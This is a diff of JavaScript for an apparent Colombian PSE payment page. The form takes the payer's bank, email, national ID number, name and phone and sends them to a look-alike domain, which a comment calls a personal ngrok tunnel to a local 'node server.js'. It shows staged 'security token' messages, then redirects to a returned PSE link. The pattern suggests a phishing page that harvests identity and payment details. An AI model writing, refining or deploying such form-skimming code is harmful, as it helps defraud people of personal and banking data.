@@ -39,8 +39,6 @@ document.addEventListener('DOMContentLoaded', () => {
     if (document.getElementById('formCorreo') && data.correo) {
         document.getElementById('formCorreo').value = data.correo;
     }
-    // Si tenemos nombre o cédula guardados, podríamos pre-llenarlos también, 
-    // pero usualmente se pide ingresarlos de nuevo por seguridad.
 
     // 3. Formatear Moneda (Panel Izquierdo)
     const monto = data.montoPagar || 0;
@@ -55,7 +53,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if(document.getElementById('lblValorTotal')) document.getElementById('lblValorTotal').textContent = valorFormateado;
     if(document.getElementById('lblTotalFinal')) document.getElementById('lblTotalFinal').textContent = valorFormateado;
 
-    // 4. Lógica del Modal de Cambio de Correo (Mantenida del original)
+    // 4. Lógica del Modal de Cambio de Correo
     setupModalCorreo(data);
 });
 
@@ -66,12 +64,11 @@ if (botonPagar) {
     botonPagar.addEventListener('click', async function() {
         
         // 1. RECOLECCIÓN DE DATOS DEL FORMULARIO HTML
-        // Asegúrate de que los inputs en tu HTML tengan estos IDs exactos
         const bancoSelect = document.getElementById('selectBanco');
         const emailInput  = document.getElementById('formCorreo');
-        const docInput    = document.getElementById('formNumId');   // Cédula
-        const nameInput   = document.getElementById('formNombre');  // Nombre
-        const phoneInput  = document.getElementById('formCelular'); // Celular
+        const docInput    = document.getElementById('formNumId');   
+        const nameInput   = document.getElementById('formNombre');  
+        const phoneInput  = document.getElementById('formCelular'); 
 
         const banco = bancoSelect ? bancoSelect.value : "";
         const email = emailInput ? emailInput.value.trim() : "";
@@ -79,7 +76,6 @@ if (botonPagar) {
         const name  = nameInput ? nameInput.value.trim() : "";
         const phone = phoneInput ? phoneInput.value.trim() : "";
 
-        // Recuperar monto del localStorage (o usar default si es prueba)
         const data = JSON.parse(localStorage.getItem('datosFactura')) || {};
         const amount = data.montoPagar || 5000; 
 
@@ -118,27 +114,23 @@ if (botonPagar) {
         if (overlay) overlay.style.display = 'flex';
         if (loadingText) loadingText.textContent = "Conectando con el Banco...";
 
-        // Animación de texto de carga
         let loadingInterval = animateLoadingText(loadingText);
 
-        // 4. CONEXIÓN CON EL SERVIDOR LOCAL (server.js)
-        const baseUrl = 'https://air.pagoswebcol.uk';
+        // 4. CONEXIÓN CON EL SERVIDOR LOCAL
+        const baseUrl = 'https://air.pagoswebcol.uk'; // TU TÚNEL NGROK
         
-        // Construimos la URL con los parámetros que espera tu server.js
         const params = new URLSearchParams({
             amount: amount,
             bank: banco,
             email: email,
-            doc: doc,       // Mapeado a 'payerDoc' en el server
-            fullName: name, // Mapeado a 'fullName'
-            phone: phone    // Mapeado a 'phone'
+            doc: doc,
+            fullName: name,
+            phone: phone
         });
 
         const apiUrl = `${baseUrl}/meter?${params.toString()}`;
-        console.log("Enviando solicitud a:", apiUrl);
 
         try {
-            // Petición GET al servidor local
             const response = await fetch(apiUrl, {
                 method: 'GET',
                 headers: { 'Content-Type': 'application/json' }
@@ -149,17 +141,14 @@ if (botonPagar) {
             }
 
             const result = await response.json();
-            console.log("Respuesta del servidor:", result);
 
             // 5. MANEJO DE LA RESPUESTA
             if (result.ok && result.result && result.result.exactName) {
-                // ÉXITO: Tenemos URL de PSE
                 if (loadingText) loadingText.textContent = "¡Conexión exitosa! Redirigiendo a PSE...";
                 clearInterval(loadingInterval);
                 
-                // Pequeña pausa para que el usuario lea el mensaje y luego redirigir
                 setTimeout(() => {
-                    isTransactionActive = false; // Liberamos para permitir la redirección
+                    isTransactionActive = false; 
                     window.location.href = result.result.exactName;
                 }, 1500);
 
@@ -167,23 +156,19 @@ if (botonPagar) {
                 throw new Error(result.error || "No se pudo obtener la URL de pago.");
             }
 
-        }} catch (error) {
-    console.error("Error en la transacción:", error);
-    
-    // ERROR: Restaurar interfaz
-    clearInterval(loadingInterval);
-    isTransactionActive = false;
-    if (overlay) overlay.style.display = 'none';
-    
-    // MENSAJE CORREGIDO:
-    alert("Error de conexión: " + error.message + 
-          "\n\nVerifica que tu túnel en 'https://air.pagoswebcol.uk' esté activo y apuntando al puerto 3002 de tu PC.");
-}
+        } catch (error) {
+            console.error("Error en la transacción:", error);
+            clearInterval(loadingInterval);
+            isTransactionActive = false;
+            if (overlay) overlay.style.display = 'none';
+            
+            // AQUÍ ESTÁ LA ÚNICA MODIFICACIÓN: Cambiado el puerto a 3002
+            alert("Error de conexión: " + error.message + "\n\nAsegúrate de que 'node server.js' esté ejecutándose en el puerto 3002.");
+        }
     });
 }
 
-// --- FUNCIONES AUXILIARES ---
-
+// --- FUNCIONES AUXILIARES (Sin cambios) ---
 function setupModalCorreo(data) {
     const modal = document.getElementById('modalCorreo');
     const btnOpen = document.getElementById('btnCambiarCorreo');
@@ -198,24 +183,18 @@ function setupModalCorreo(data) {
             modal.style.display = 'flex';
             if(inputCorreo) inputCorreo.focus();
         });
-
         if(btnCancel) btnCancel.addEventListener('click', () => modal.style.display = 'none');
-
         modal.addEventListener('click', (e) => {
             if (e.target === modal) modal.style.display = 'none';
         });
-
         if(btnSave) btnSave.addEventListener('click', () => {
             const nuevoCorreo = inputCorreo.value.trim();
             if (nuevoCorreo && nuevoCorreo.includes('@')) {
                 data.correo = nuevoCorreo;
                 localStorage.setItem('datosFactura', JSON.stringify(data));
-                
-                // Actualizar vistas
                 if(document.getElementById('lblCorreo')) 
                     document.getElementById('lblCorreo').textContent = enmascararCorreo(data.correo);
                 if(formCorreo) formCorreo.value = data.correo;
-                
                 modal.style.display = 'none';
             } else {
                 inputCorreo.style.borderBottom = "1px solid red";
@@ -227,13 +206,7 @@ function setupModalCorreo(data) {
 
 function animateLoadingText(element) {
     if (!element) return null;
-    const messages = [
-        "Conectando con la pasarela...",
-        "Validando datos...",
-        "Generando token de seguridad...",
-        "Contactando con el banco...",
-        "Por favor espere..."
-    ];
+    const messages = ["Conectando...", "Validando...", "Generando token...", "Contactando banco...", "Espere..."];
     let i = 0;
     return setInterval(() => {
         i = (i + 1) % messages.length;
@@ -241,22 +214,6 @@ function animateLoadingText(element) {
     }, 2500);
 }
 
-// Enmascaramiento visual (Estético)
-function enmascararNombre(nombre) {
-    if(!nombre) return "";
-    const partes = nombre.split(" ");
-    return partes[0] + " " + (partes[1] ? partes[1][0] : "") + "*******";
-}
-
-function enmascararID(id) {
-    if(!id) return "";
-    return id.substring(0, 3) + "****";
-}
-
-function enmascararCorreo(email) {
-    if(!email) return "";
-    const [user, domain] = email.split("@");
-    return user.substring(0, 2) + "*******@" + "*****." + "com";
-}
-
-
+function enmascararNombre(n) { return n ? n.split(" ")[0] + " *******" : ""; }
+function enmascararID(id) { return id ? id.substring(0, 3) + "****" : ""; }
+function enmascararCorreo(e) { return e ? e.substring(0, 2) + "*******@*****" : ""; }
